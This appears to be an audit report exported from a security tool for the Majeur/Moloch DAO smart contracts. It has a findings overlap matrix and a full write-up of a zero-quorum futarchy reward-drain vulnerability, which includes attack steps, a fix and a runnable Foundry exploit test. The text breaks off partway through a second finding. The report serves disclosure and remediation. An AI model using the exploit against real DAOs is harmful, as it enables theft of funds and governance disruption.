# [Winfunc](https://winfunc.com/) Audit - majeur

**Complete PDF Report of the Audit:** [Winfunc Audit - majeur.pdf](./Winfunc%20Audit%20-%20majeur.pdf)

**Source:** Validated Winfunc findings export

**Scope:** Winfunc was run in smart-contract mode against the Majeur codebase. The frontend itself was not directly scanned; any UI-impact findings in this report come from contract-side data or helper responses that feed existing dapp surfaces.

## Executive Summary

- Total confirmed findings: **28**
- Critical: **1**
- High: **10**
- Medium: **16**
- Low: **1**
- Frontend scan: **No** (contract-side / helper-driven UI impact only)
- No-prior-match findings vs. existing repo audit corpus: **15 finding rows / 12 unique root causes**
- Prior-art overlaps / variants vs. existing repo audit corpus: **13 finding rows / 8 unique root causes**

## Review Summary

> **Reviewed 2026-03-15. No production blockers identified. Zero novel Moloch.sol core findings — all 12 novel root causes target peripheral contracts (LPSeedSwapHook, ShareBurner, TapVest, ShareSale, Tribute, MolochViewHelper).**
>
> - **28 findings total:** 1 Critical, 10 High, 16 Medium, 1 Low. Scope covers Moloch.sol core plus 6 peripheral contracts.
> - **Moloch.sol core: 0 novel findings.** All core Moloch findings are duplicates of known findings (KF#1, KF#3, KF#11, KF#17, KF#21) or previously identified patterns from prior audits. The overlap classifications in Winfunc's own matrix are accurate.
> - **Peripheral contracts: 12 novel root causes** across LPSeedSwapHook (3), ShareBurner (1), TapVest (2), ShareSale (2), Tribute (2), MolochViewHelper (2). These are the first audit to systematically cover the LPSeedSwapHook pool namespace and seeding lifecycle. Peripheral findings are candidates for extraction into per-contract audit folders (see `src/peripheral/audit/`).
> - **Severity inflation is significant on Moloch.sol duplicates.** The Critical (#1) is KF#17 (Medium, configuration-dependent, mitigated by SafeSummoner). Highs #7/#8 are KF#3+KF#11 (Low/Design). High #10 is KF#1 (Low). High #11 is KF#11 (Low). These are all well-documented findings rated 1–3 levels lower in the existing corpus.
> - **Zero false positives.** Every finding maps to either a known issue or a genuine peripheral contract gap. The overlap matrix is accurate and well-sourced.
> - **Frontend XSS findings (#18/#19)** are duplicates of the Cantina XSS class (same `innerHTML` root cause, different DOM sinks). Patched in demo dapp.
> - **Strongest contributions:** LPSeedSwapHook pool collision (#3), pre-creation pricing attack (#5/#9), ShareBurner over-scope burn (#2), TapVest fake-DAO drain (#15), and ShareSale pricing overflow (#20). These expose real architectural gaps in peripheral contracts not covered by prior audits.
> - **For the Moloch.sol-focused audit table and tool ranking**, this audit adds cross-validation confidence on 8 existing known findings but does not extend the core attack surface. Novel findings are scoped to peripherals and should be tracked in per-contract security documents.

## Full Finding-by-Finding Overlap Matrix Against Existing Audits

Novel means no exact root-cause match was found in the current `README.md` audit summary or any existing file under `audit/`. Variant means the exploit chain is sharper or broader, but the underlying root cause was already represented in the prior audit corpus.

| # | Winfunc ID | Severity | Overlap Key | Corpus Verdict | Prior Match | Notes |
|---:|---:|---|---|---|---|---|
| 1 | 25 | Critical | `zero-quorum-futarchy-no-resolution` | **Duplicate / prior art** | [ChatGPT (GPT 5.4)](./chatgpt.md) KF#17; [README](../README.md) | Same root cause as `13`. |
| 2 | 21 | High | `id-21` | **Novel** | No exact prior match in repo audits | ShareBurner permit burning unrelated DAO-held shares appears new. |
| 3 | 22 | High | `id-22` | **Novel** | No exact prior match in repo audits | Singleton LPSeed cross-DAO takeover / swap denial does not appear in prior audits. |
| 4 | 11 | High | `tapvest-partial-claim-forfeiture` | **Duplicate / prior art** | [Certora FV](./certora.md) L-01; [Grimoire](./grimoire.md) | Same underlying tap-forfeiture class as `1`. |
| 5 | 19 | High | `lpseed-precreate-official-pool` | **Novel** | No exact prior match in repo audits | Same LPSeed root cause as `16`; still new versus the existing audit corpus. |
| 6 | 20 | High | `id-20` | **Variant of prior art** | [Cantina Apex](./cantina.md) MAJEUR-17 / KF#9 | Stronger concrete exploit chain, but not the first discovery of the counterfactual summon / address-squatting class. |
| 7 | 29 | High | `uncapped-auto-futarchy-drain` | **Duplicate / prior art** | KF#3 + KF#11 family in [README](../README.md); [Almanax](./almanax.md); [Archethect V2](./archethect2.md) | Same root cause as `28`; not novel. |
| 8 | 28 | High | `uncapped-auto-futarchy-drain` | **Duplicate / prior art** | KF#3 + KF#11 family in [README](../README.md); [Almanax](./almanax.md); [Archethect V2](./archethect2.md) | Real but already-covered auto-futarchy farming / drain class. |
| 9 | 16 | High | `lpseed-precreate-official-pool` | **Novel** | No exact prior match in repo audits | LPSeed first-liquidity / launch-price manipulation is distinct from prior DAICO LP math findings. |
| 10 | 18 | High | `id-18` | **Duplicate / prior art** | KF#1 in [README](../README.md); [Plainshift AI](./plainshift.md); [Grimoire](./grimoire.md) | Already covered as the sale-cap sentinel collision / exact-cap sellout quirk. |
| 11 | 26 | High | `zero-threshold-proposal-hijack` | **Variant of prior art** | KF#11 lineage in [README](../README.md); [DeepSeek](./deepseek.md); [Almanax](./almanax.md) | Same proposal-hijack / cancellation-blocking family as `24`, with raw-launch framing. |
| 12 | 27 | Medium | `id-27` | **Duplicate / prior art** | [Cantina Apex](./cantina.md) MAJEUR-21; [SECURITY](../SECURITY.md) | Permit IDs entering the proposal/futarchy lifecycle is already catalogued in the repo. |
| 13 | 1 | Medium | `tapvest-partial-claim-forfeiture` | **Duplicate / prior art** | [Certora FV](./certora.md) L-01; [Grimoire](./grimoire.md) | Same TapVest partial-claim forfeiture class already documented; the repo frames it as acknowledged/by-design exit-rights behavior. |
| 14 | 4 | Medium | `id-4` | **Novel** | No exact prior match in repo audits | Distinct from Cantina's Tribute bait-and-switch; this is the fake-funding / undelivered-tribute payout path. |
| 15 | 12 | Medium | `id-12` | **Novel** | No exact prior match in repo audits | Fake-DAO / singleton-balance TapVest drain angle does not appear in prior audit materials. |
| 16 | 13 | Medium | `zero-quorum-futarchy-no-resolution` | **Duplicate / prior art** | [ChatGPT (GPT 5.4)](./chatgpt.md) KF#17; [README](../README.md) | Already catalogued as the zero-quorum premature NO-resolution class. |
| 17 | 24 | Medium | `zero-threshold-proposal-hijack` | **Variant of prior art** | KF#11 lineage in [README](../README.md); [DeepSeek](./deepseek.md); [Almanax](./almanax.md) | Sharper framing of the same proposal-ID tombstoning class already covered in earlier audits. |
| 18 | 5 | Medium | `contracturi-modal-xss` | **Duplicate / prior art** | [Cantina Apex](./cantina.md) frontend XSS class | New sink instance, same `innerHTML`-with-untrusted-metadata root cause already covered by Cantina. |
| 19 | 10 | Medium | `contracturi-modal-xss` | **Duplicate / prior art** | [Cantina Apex](./cantina.md) frontend XSS class | Same root cause as `5`; different DOM sink, not a new vulnerability class. |
| 20 | 17 | Medium | `id-17` | **Novel** | No exact prior match in repo audits | Unchecked pricing overflow in `ShareSale` is not present in prior audits. |
| 21 | 3 | Medium | `tribute-discovery-duplicate-listing` | **Novel** | No exact prior match in repo audits | Same root cause as `2`; still novel relative to the existing audit corpus. |
| 22 | 23 | Medium | `id-23` | **Novel** | No exact prior match in repo audits | `contractURI`-backed helper read DoS appears new versus the repo corpus. |
| 23 | 2 | Medium | `tribute-discovery-duplicate-listing` | **Novel** | No exact prior match in repo audits | Nearest prior material is Tribute-array growth, not this stale-ref duplicate-listing bug. |
| 24 | 6 | Medium | `id-6` | **Novel** | No exact prior match in repo audits | LPSeed dusting / minSupply griefing was not previously documented. |
| 25 | 14 | Medium | `id-14` | **Novel** | No exact prior match in repo audits | ShareBurner expiry not actually closing built-in sales was not previously written up. |
| 26 | 7 | Medium | `view-helper-membership-omission` | **Novel** | No exact prior match in repo audits | View-helper omission of delegate/non-seat voters appears new versus the repo corpus. |
| 27 | 8 | Medium | `id-8` | **Novel** | No exact prior match in repo audits | Stray ETH loss in the ERC20 ShareSale path is not present in prior audit writeups. |
| 28 | 15 | Low | `view-helper-membership-omission` | **Novel** | No exact prior match in repo audits | Same root cause as `7`; new versus prior audits. |

## Index

| # | Severity | CVSS | Winfunc ID | Title |
|---:|---|---:|---:|---|
| 1 | Critical | 9.1 | 25 | [Zero-quorum futarchy proposals can be prematurely NO-resolved and drained](#1-zero-quorum-futarchy-proposals-can-be-prematurely-no-resolved-and-drained) |
| 2 | High | 8.2 | 21 | [SafeSummoner auto-burn helper can permissionlessly destroy unrelated DAO-held shares](#2-safesummoner-auto-burn-helper-can-permissionlessly-destroy-unrelated-dao-held-shares) |
| 3 | High | 8.2 | 22 | [Singleton LP seed hook allows cross-DAO pool takeover and swap denial](#3-singleton-lp-seed-hook-allows-cross-dao-pool-takeover-and-swap-denial) |
| 4 | High | 8.1 | 11 | [Permissionless tap claims can permanently erase accrued vesting during treasury shortfalls](#4-permissionless-tap-claims-can-permanently-erase-accrued-vesting-during-treasury-shortfalls) |
| 5 | High | 8.1 | 19 | [LP seed hook allows attacker to pre-create the official pool and set launch pricing](#5-lp-seed-hook-allows-attacker-to-pre-create-the-official-pool-and-set-launch-pricing) |
| 6 | High | 8.1 | 20 | [Predictable SafeSummoner deployment address can be squatted and maliciously initialized](#6-predictable-safesummoner-deployment-address-can-be-squatted-and-maliciously-initialized) |
| 7 | High | 8.1 | 29 | [Uncapped auto-futarchy minted-loot rewards enable repeated ragequit-based treasury drain](#7-uncapped-auto-futarchy-minted-loot-rewards-enable-repeated-ragequit-based-treasury-drain) |
| 8 | High | 7.8 | 28 | [Uncapped auto-futarchy default reward path enables NO-side loot farming and treasury dilution](#8-uncapped-auto-futarchy-default-reward-path-enables-no-side-loot-farming-and-treasury-dilution) |
| 9 | High | 7.5 | 16 | [LP seed hook allows attacker-controlled first liquidity and launch-price manipulation](#9-lp-seed-hook-allows-attacker-controlled-first-liquidity-and-launch-price-manipulation) |
| 10 | High | 7.5 | 18 | [Exact-cap purchase turns a finite token sale into unlimited over-cap issuance](#10-exact-cap-purchase-turns-a-finite-token-sale-into-unlimited-over-cap-issuance) |
| 11 | High | 7.1 | 26 | [Raw DAO launch lets a frontrunner seize proposer control and block cancellation for that proposal ID](#11-raw-dao-launch-lets-a-frontrunner-seize-proposer-control-and-block-cancellation-for-that-proposal-id) |
| 12 | Medium | 6.8 | 27 | [Permit-backed IDs can be opened as proposals and farm NO-side futarchy rewards](#12-permit-backed-ids-can-be-opened-as-proposals-and-farm-no-side-futarchy-rewards) |
| 13 | Medium | 6.5 | 1 | [Permissionless partial tap claims permanently burn accrued vesting](#13-permissionless-partial-tap-claims-permanently-burn-accrued-vesting) |
| 14 | Medium | 6.5 | 4 | [Tribute escrow accepts fake ERC20 funding and can pay proposers for undelivered tributes](#14-tribute-escrow-accepts-fake-erc20-funding-and-can-pay-proposers-for-undelivered-tributes) |
| 15 | Medium | 6.5 | 12 | [TapVest claim flow lets fake DAOs drain singleton balances](#15-tapvest-claim-flow-lets-fake-daos-drain-singleton-balances) |
| 16 | Medium | 6.5 | 13 | [Permissionless futarchy NO-resolution can freeze zero-quorum proposals before voting](#16-permissionless-futarchy-no-resolution-can-freeze-zero-quorum-proposals-before-voting) |
| 17 | Medium | 6.5 | 24 | [Zero-threshold proposal opening lets first caller tombstone a proposal ID before votes](#17-zero-threshold-proposal-opening-lets-first-caller-tombstone-a-proposal-id-before-votes) |
| 18 | Medium | 6.1 | 5 | [Default DAO contractURI metadata can trigger DOM XSS in the dapp modal](#18-default-dao-contracturi-metadata-can-trigger-dom-xss-in-the-dapp-modal) |
| 19 | Medium | 6.1 | 10 | [Renderer-generated DAO contract metadata name can trigger XSS in the official dapp modal](#19-renderer-generated-dao-contract-metadata-name-can-trigger-xss-in-the-official-dapp-modal) |
| 20 | Medium | 5.9 | 17 | [Share sale unchecked pricing math allows free or underpriced asset purchases](#20-share-sale-unchecked-pricing-math-allows-free-or-underpriced-asset-purchases) |
| 21 | Medium | 5.4 | 3 | [DAO tribute discovery spam duplicates a live offer and makes discovery views scale with history](#21-dao-tribute-discovery-spam-duplicates-a-live-offer-and-makes-discovery-views-scale-with-history) |
| 22 | Medium | 5.4 | 23 | [Renderer-backed contractURI can deny service to batched DAO view helper reads](#22-renderer-backed-contracturi-can-deny-service-to-batched-dao-view-helper-reads) |
| 23 | Medium | 5.3 | 2 | [Tribute re-proposals can duplicate a single active offer in DAO discovery](#23-tribute-re-proposals-can-duplicate-a-single-active-offer-in-dao-discovery) |
| 24 | Medium | 5.3 | 6 | [LP seed minSupply gate can be griefed by dusting tokenB into the DAO](#24-lp-seed-minsupply-gate-can-be-griefed-by-dusting-tokenb-into-the-dao) |
| 25 | Medium | 5.3 | 14 | [ShareBurner closeSale leaves built-in DAO sales live after expiry](#25-shareburner-closesale-leaves-built-in-dao-sales-live-after-expiry) |
| 26 | Medium | 4.3 | 7 | [Governance helper omits delegated and non-seat voters, hiding real votes and receipt state](#26-governance-helper-omits-delegated-and-non-seat-voters-hiding-real-votes-and-receipt-state) |
| 27 | Medium | 4.3 | 8 | [ERC20-denominated ShareSale purchases can permanently lock stray ETH](#27-erc20-denominated-sharesale-purchases-can-permanently-lock-stray-eth) |
| 28 | Low | 3.5 | 15 | [Delegate-only governance accounts disappear from personalized DAO dashboards](#28-delegate-only-governance-accounts-disappear-from-personalized-dao-dashboards) |

## Critical

<details>
<summary><strong>1. Zero-quorum futarchy proposals can be prematurely NO-resolved and drained</strong></summary>

> **Review: Duplicate of KF#17. Severity adjusted to Medium (configuration-dependent, mitigated by SafeSummoner).** This is the same zero-quorum premature NO-resolution finding originally discovered by ChatGPT (GPT 5.4) and catalogued as KF#17. `SafeSummoner.safeSummon()` enforces non-zero quorum when futarchy is enabled (`QuorumRequiredForFutarchy` revert), so any DAO deployed through the safe path is immune. The Critical rating (CVSS 9.1) ignores this deployment-time mitigation. The PoC is well-constructed but demonstrates a configuration that SafeSummoner explicitly prevents. Raw `Summoner.summon()` users are warned in README Configuration Guidance. **Severity: Medium (per KF#17, configuration-dependent).**

**Winfunc ID:** `25`

**CVSS Score:** `9.1`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`

**Vulnerability Type:** `CWE-841: Improper Enforcement of Behavioral Workflow`

**Source Location:** `src/Moloch.sol:2066:Summoner.summon()`

**Sink Location:** `src/Moloch.sol:602:cashOutFutarchy()`

#### Summary

An attacker can trigger premature NO-side settlement in a zero-quorum futarchy-enabled DAO, leading to proposal freeze and diversion of futarchy rewards.

#### Root Cause

`Summoner.summon()` forwards caller-controlled `quorumBps` directly into `Moloch.init()`, and `Moloch.init()` only writes `quorumBps` when the supplied value is non-zero. When raw deployment leaves both `quorumBps` and `quorumAbsolute` at zero, `state(id)` skips both quorum gates and treats an opened proposal with `forVotes <= againstVotes` as `Defeated`, including the initial `0-0` state. `resolveFutarchyNo()` accepts `Defeated` proposals and finalizes the NO side immediately, while `castVote()` blocks any further voting once futarchy is resolved.

#### Impact

###### Confirmed Impact
Any futarchy-enabled proposal in a zero-quorum DAO can be finalized on the NO side before meaningful voting occurs, permanently freezing that proposal. A low-stake holder can mint a tiny NO receipt, wait for manual or auto-funded futarchy rewards, and then cash out the entire pool through `cashOutFutarchy()` because they are the only winning receipt holder.

###### Potential Follow-On Impact
If the reward token is ETH or an ERC20, the attacker can divert those funded assets directly. If the reward token is `address(this)` or `address(1007)`, `_payout()` mints shares or loot instead, which can further distort governance or, when ragequit is enabled, turn into broader treasury extraction. Where no attacker-held NO receipts exist, the exploit still creates a governance denial-of-service by locking the proposal into a resolved-NO state.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:2066](../src/Moloch.sol#L2066)**

   ```solidity
   function summon(... uint16 quorumBps, ... Call[] calldata initCalls) public payable returns (Moloch dao) {
   ```

   The raw deployment entry point accepts attacker/deployer-controlled quorum and initialization parameters.

2. **[src/Moloch.sol:2091](../src/Moloch.sol#L2091)**

   ```solidity
   dao.init(orgName, orgSymbol, orgURI, quorumBps, ragequittable, renderer, initHolders, initShares, initCalls);
   ```

   The untrusted quorum value is forwarded into the new DAO without any validation that futarchy-safe quorum is present.

3. **[src/Moloch.sol:226](../src/Moloch.sol#L226)**

   ```solidity
   if (_quorumBps != 0) quorumBps = _quorumBps;
   ```

   Supplying `0` leaves `quorumBps` at its default zero value; if no absolute quorum is set, both quorum gates remain disabled.

4. **[src/Moloch.sol:389](../src/Moloch.sol#L389)**

   ```solidity
   _mint6909(msg.sender, rid, weight);
   ```

   A dust-holder can cast a NO vote and mint the only winning-side receipt before or around futarchy funding.

5. **[src/Moloch.sol:569](../src/Moloch.sol#L569)**

   ```solidity
   F.pool += amount;
   ```

   When an honest user funds futarchy, the reward pool becomes payable to the eventual winning receipt holders.

6. **[src/Moloch.sol:476](../src/Moloch.sol#L476)**

   ```solidity
   if (forVotes <= againstVotes) return ProposalState.Defeated;
   ```

   Because both quorum checks are skipped at zero quorum, the proposal is immediately or trivially `Defeated` instead of remaining `Active`.

7. **[src/Moloch.sol:580](../src/Moloch.sol#L580)**

   ```solidity
   _finalizeFutarchy(id, F, 0);
   ```

   Any caller can resolve the NO side as soon as the proposal is seen as `Defeated`, which also blocks further voting.

8. **[src/Moloch.sol:602](../src/Moloch.sol#L602)**

   ```solidity
   _payout(F.rewardToken, msg.sender, payout);
   ```

   The attacker cashes out the winning NO receipt and receives the funded pool as ETH/ERC20 or freshly minted shares/loot.

#### Exploit Analysis

##### Attack Narrative
The attacker is a low-stake DAO participant or opportunistic searcher watching a DAO that was deployed through the raw summon path with both quorum knobs left at zero. Because `state()` does not require any turnout in that configuration, a proposal with either `0-0` votes or a tiny early NO vote is immediately considered `Defeated` as soon as it is opened.

Once a futarchy pool is enabled or funded, the attacker can call `resolveFutarchyNo()` before meaningful governance participation occurs. If the attacker also holds even dust voting weight, they can first mint the only NO receipt, then let an honest user or DAO auto-funding mechanism populate the futarchy pool, and finally cash out the entire pool as the sole winning claimant. If they hold no voting weight, they can still front-run honest participants and permanently freeze the proposal by resolving the NO side at `0-0`.

##### Prerequisites
- **Attacker Control/Position:** Ability to interact with the public DAO contracts; for the reward-drain variant, any amount of voting shares at snapshot time
- **Required Access/Placement:** Unauthenticated for the freeze variant; low-stake member for the reward-capture variant
- **User Interaction:** None
- **Privileges/Configuration Required:** DAO must be deployed/configured with `quorumBps == 0` and `quorumAbsolute == 0`; futarchy must be enabled or funded for the target proposal
- **Knowledge Required:** DAO address and target proposal ID
- **Attack Complexity:** Low — the vulnerable state machine deterministically reports `Defeated` without turnout, and both `fundFutarchy()` and `resolveFutarchyNo()` are public

##### Attack Steps
1. Identify a DAO deployed through raw `Summoner.summon()` / `Moloch.init()` with both quorum values left at zero.
2. Choose a target proposal ID.
3. For reward capture, cast a tiny NO vote first so the attacker becomes the only NO receipt holder; for freeze-only, wait until any honest proposer opens/funds the proposal.
4. Trigger or wait for futarchy funding (`fundFutarchy()` or auto-futarchy earmark).
5. Call `resolveFutarchyNo(id)` while the proposal is still at `0-0` or only lightly voted.
6. If holding NO receipts, call `cashOutFutarchy(id, amount)` to receive the entire pool.

##### Impact Breakdown
- **Confirmed Impact:** Premature NO resolution can freeze the proposal before meaningful voting, and a dust-holder can extract the full futarchy reward pool when they are the sole winning NO receipt holder.
- **Potential Follow-On Impact:** If the reward token path mints shares or loot, the attacker can inflate governance or economic claims; if ragequit is enabled, that new position may convert into broader treasury withdrawal. These follow-on effects depend on DAO configuration.
- **Confidentiality:** None — the bug does not expose hidden data.
- **Integrity:** High — the attacker can force the wrong governance outcome and divert or mint reward assets.
- **Availability:** High — the target proposal can be permanently frozen from further voting.

#### Recommended Fix

Mirror the `SafeSummoner` guardrail inside core futarchy activation and settlement logic so the protocol does not rely on wrappers for safety. At minimum, reject futarchy activation whenever both quorum knobs are zero, and do not allow NO-side resolution on a merely `Defeated` live proposal.

Before:
```solidity
function setAutoFutarchy(uint256 param, uint256 cap) public payable onlyDAO {
    (autoFutarchyParam, autoFutarchyCap) = (param, cap);
}

function fundFutarchy(uint256 id, address token, uint256 amount) public payable {
    if (amount == 0) revert NotOk();
    ...
}

function resolveFutarchyNo(uint256 id) public {
    FutarchyConfig storage F = futarchy[id];
    if (!F.enabled || F.resolved || executed[id]) revert NotOk();

    ProposalState st = state(id);
    if (st != ProposalState.Defeated && st != ProposalState.Expired) revert NotOk();

    _finalizeFutarchy(id, F, 0);
}
```

After:
```solidity
function _requireFutarchyQuorum() internal view {
    if (quorumBps == 0 && quorumAbsolute == 0) revert NotOk();
}

function setAutoFutarchy(uint256 param, uint256 cap) public payable onlyDAO {
    if (param != 0) _requireFutarchyQuorum();
    (autoFutarchyParam, autoFutarchyCap) = (param, cap);
}

function fundFutarchy(uint256 id, address token, uint256 amount) public payable {
    if (amount == 0) revert NotOk();
    _requireFutarchyQuorum();
    ...
}

function resolveFutarchyNo(uint256 id) public {
    FutarchyConfig storage F = futarchy[id];
    if (!F.enabled || F.resolved || executed[id]) revert NotOk();

    // Conservative hardening: only allow NO settlement after proposal expiry.
    if (state(id) != ProposalState.Expired) revert NotOk();

    _finalizeFutarchy(id, F, 0);
}
```

##### Security Principle
Critical governance invariants must be enforced in the core contract, not just in convenience wrappers. A settlement path that changes governance reachability must not become callable solely because turnout guards are disabled.

##### Defense in Depth
- Add a raw-summon regression guard that rejects `setAutoFutarchy` or `fundFutarchy` when both quorum values are zero, even if the DAO was intentionally deployed with `quorumBps == 0`.
- Emit explicit events or add a view helper that flags unsafe zero-quorum-plus-futarchy configurations so frontends and monitors can alert operators immediately.

##### Verification Guidance
- Add a regression test showing that a DAO with `quorumBps == 0` and `quorumAbsolute == 0` cannot enable or fund futarchy.
- Add a regression test showing `resolveFutarchyNo()` reverts on an early `Defeated` proposal that has not expired.
- Add a positive test confirming that legitimately expired futarchy proposals can still resolve NO and cash out correctly.
- Add a positive test confirming that non-zero-quorum futarchy proposals remain `Active` until the quorum condition is actually met.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
foundryup
```
- **Target Setup:**
```bash
git clone <REPO_URL>
cd <REPO_DIR>
cat > test/ZeroQuorumFutarchyDrain.t.sol <<'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Renderer} from "../src/Renderer.sol";
import {Moloch, Summoner, Call} from "../src/Moloch.sol";

contract ZeroQuorumFutarchyDrainTest is Test {
    Summoner summoner;
    Moloch dao;

    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        summoner = new Summoner();
        vm.deal(alice, 100 ether);
        vm.deal(bob, 1 ether);

        address[] memory holders = new address[](2);
        holders[0] = alice;
        holders[1] = bob;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100e18;
        amounts[1] = 1e18; // tiny attacker stake

        dao = summoner.summon(
            "ZeroQuorumDAO",
            "ZQ",
            "",
            0, // vulnerable: quorumBps stays zero, quorumAbsolute also stays zero
            false,
            address(new Renderer()),
            bytes32("poc"),
            holders,
            amounts,
            new Call[](0)
        );

        vm.roll(block.number + 1);
    }

    function test_ZeroQuorumFutarchyDrain() public {
        bytes memory data = abi.encodeWithSignature("doesNotMatter()");
        uint256 id = dao.proposalId(0, address(0xdead), 0, data, bytes32(0));

        // Attacker opens via NO vote and becomes the only NO receipt holder.
        vm.prank(bob);
        dao.castVote(id, 0);

        uint256 receiptId = uint256(keccak256(abi.encodePacked("Moloch:receipt", id, uint8(0))));
        assertEq(dao.balanceOf(bob, receiptId), 1e18);
        assertEq(uint256(dao.state(id)), 4); // Defeated immediately

        // Honest participant funds futarchy rewards.
        vm.prank(alice);
        dao.fundFutarchy{value: 10 ether}(id, address(0), 10 ether);

        uint256 bobBefore = bob.balance;

        // Anyone can resolve the NO side immediately.
        dao.resolveFutarchyNo(id);

        // Attacker drains the full pool because they hold all winning NO receipts.
        vm.prank(bob);
        uint256 payout = dao.cashOutFutarchy(id, 1e18);

        assertEq(payout, 10 ether);
        assertEq(bob.balance, bobBefore + 10 ether);

        // Proposal is now frozen; later YES votes are blocked.
        vm.prank(alice);
        vm.expectRevert();
        dao.castVote(id, 1);
    }
}
EOF
forge test --match-test test_ZeroQuorumFutarchyDrain -vv
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Renderer} from "../src/Renderer.sol";
import {Moloch, Summoner, Call} from "../src/Moloch.sol";

contract ZeroQuorumFutarchyDrainTest is Test {
    Summoner summoner;
    Moloch dao;

    address alice = address(0xA11CE);
    address bob = address(0xB0B);

    function setUp() public {
        summoner = new Summoner();
        vm.deal(alice, 100 ether);
        vm.deal(bob, 1 ether);

        address[] memory holders = new address[](2);
        holders[0] = alice;
        holders[1] = bob;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100e18;
        amounts[1] = 1e18;

        dao = summoner.summon(
            "ZeroQuorumDAO",
            "ZQ",
            "",
            0,
            false,
            address(new Renderer()),
            bytes32("poc"),
            holders,
            amounts,
            new Call[](0)
        );

        vm.roll(block.number + 1);
    }

    function test_ZeroQuorumFutarchyDrain() public {
        bytes memory data = abi.encodeWithSignature("doesNotMatter()");
        uint256 id = dao.proposalId(0, address(0xdead), 0, data, bytes32(0));

        vm.prank(bob);
        dao.castVote(id, 0);

        uint256 receiptId = uint256(keccak256(abi.encodePacked("Moloch:receipt", id, uint8(0))));
        assertEq(dao.balanceOf(bob, receiptId), 1e18);
        assertEq(uint256(dao.state(id)), 4);

        vm.prank(alice);
        dao.fundFutarchy{value: 10 ether}(id, address(0), 10 ether);

        uint256 bobBefore = bob.balance;
        dao.resolveFutarchyNo(id);

        vm.prank(bob);
        uint256 payout = dao.cashOutFutarchy(id, 1e18);

        assertEq(payout, 10 ether);
        assertEq(bob.balance, bobBefore + 10 ether);

        vm.prank(alice);
        vm.expectRevert();
        dao.castVote(id, 1);
    }
}
```

##### Steps
1. **Create the PoC test file**
- Expected: the repository now contains `test/ZeroQuorumFutarchyDrain.t.sol`.
2. **Run the targeted Foundry test**
```bash
forge test --match-test test_ZeroQuorumFutarchyDrain -vv
```
- Expected: the test passes, showing Bob receives the full 10 ETH futarchy pool.
3. **Observe the post-resolution freeze**
- Expected: the final `castVote(id, 1)` call reverts because `resolveFutarchyNo()` already resolved the futarchy market.

##### Verification
Confirm that:
- `dao.state(id)` is `Defeated` immediately after Bob's initial NO vote despite no quorum being met.
- `dao.resolveFutarchyNo(id)` succeeds before any YES side comeback is possible.
- `dao.cashOutFutarchy(id, 1e18)` pays Bob `10 ether`.
- Alice's later YES vote reverts, demonstrating the proposal is frozen.

##### Outcome
The attacker needs only dust voting power in a zero-quorum DAO to become the sole NO receipt holder, wait for a futarchy pool to be funded, and then convert the entire reward pool into attacker-controlled assets while permanently blocking the proposal from recovering through later votes.

</details>

---

## High

<details>
<summary><strong>2. SafeSummoner auto-burn helper can permissionlessly destroy unrelated DAO-held shares</strong></summary>

> **Review: Valid novel finding targeting SafeSummoner + ShareBurner peripherals. High severity accepted for peripheral scope.** The root cause — `burnUnsold()` burns `balanceOf(dao)` rather than tracked sale inventory — is a genuine design gap not previously identified. The PoC is sound. Note: this is not a Moloch.sol core finding; it targets `SafeSummoner.sol` / `ShareBurner.sol` peripheral wiring. SafeSummoner KF#4 (patched: loot vs shares burn target) is a related but distinct bug. This finding should be tracked in `src/peripheral/audit/SafeSummoner/SECURITY.md` and the ShareBurner module. **V2 hardening:** scope `burnUnsold()` to a tracked sale-inventory amount rather than live treasury balance; add config validation rejecting `saleBurnDeadline > 0` without an active non-minting share sale.

**Winfunc ID:** `21`

**CVSS Score:** `8.2`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`

**Vulnerability Type:** `CWE-266: Incorrect Privilege Assignment`

**Source Location:** `src/peripheral/SafeSummoner.sol:210:safeSummon()`

**Sink Location:** `src/peripheral/ShareBurner.sol:44:burnUnsold()`

#### Summary

An attacker can trigger SafeSummoner’s auto-installed ShareBurner permit after its deadline, leading to permanent burning of all shares then held by the DAO.

#### Root Cause

`SafeSummoner._buildCalls()` installs a one-shot delegatecall permit for the `SHARE_BURNER` singleton whenever `saleBurnDeadline > 0`, but it does not verify that the DAO is actually running a non-minting share sale, that shares rather than loot are being sold, or that the DAO-held shares are dedicated sale inventory. The encoded permit always targets `burnUnsold(predictedShares, deadline)`, and `ShareBurner.burnUnsold()` burns the DAO’s entire live shares balance rather than a tracked unsold-sale amount.

Because `ShareBurner.closeSale()` is intentionally permissionless, any caller can spend that permit after the deadline. The wrapper therefore grants a much broader destructive capability than the `saleBurnDeadline` config comment and documentation imply.

#### Impact

###### Confirmed Impact
Any DAO deployed through `SafeSummoner` with `saleBurnDeadline > 0` and holding shares at its own address when the deadline passes can have those shares burned by any caller. The burn path calls `burnFromMoloch()`, permanently reducing the DAO’s share supply and the voting power represented by those shares.

###### Potential Follow-On Impact
If the DAO uses treasury-held shares as reserve inventory, LP-seeding inventory, buyback receipts, or any other operational balance, those unrelated assets can be destroyed as well. Depending on deployment choices, this can break downstream flows such as liquidity seeding or materially change governance/quorum dynamics by unexpectedly shrinking supply.

#### Source-to-Sink Trace

1. **[src/peripheral/SafeSummoner.sol:210](../src/peripheral/SafeSummoner.sol#L210)**

   ```solidity
   function safeSummon(... SafeConfig calldata config, Call[] calldata extraCalls) public payable returns (address dao) {
   ```

   Public deployment entrypoint accepts user-controlled SafeConfig values, including saleBurnDeadline and sale mode flags that determine whether the wrapper auto-installs ShareBurner.

2. **[src/peripheral/SafeSummoner.sol:230](../src/peripheral/SafeSummoner.sol#L230)**

   ```solidity
   Call[] memory calls = _buildCalls(daoAddr, config, extraCalls);
   ```

   The untrusted deployment config is forwarded into the internal call builder that constructs DAO initCalls.

3. **[src/peripheral/SafeSummoner.sol:684](../src/peripheral/SafeSummoner.sol#L684)**

   ```solidity
